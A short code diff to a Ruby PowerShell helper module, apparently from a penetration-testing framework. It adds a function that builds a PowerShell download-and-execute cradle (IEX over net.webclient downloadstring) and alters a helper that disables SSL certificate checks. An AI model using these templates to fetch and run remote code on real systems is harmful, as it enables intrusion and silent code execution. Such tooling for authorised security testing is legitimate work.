@@ -70,7 +70,17 @@ module Powershell
     # @return [String] Powershell code to disable SSL verification
     #   checks.
     def self.ignore_ssl_certificate
-      '[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
+      '[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}'
+    end
+
+    #
+    # Download and execute string via HTTP
+    #
+    # @param url [String] string to download
+    #
+    # @return [String] PowerShell code to download and exec the url
+    def self.download_and_exec_string(url)
+      %Q^ IEX ((new-object net.webclient).downloadstring('#{url}'))^
     end
 
     #
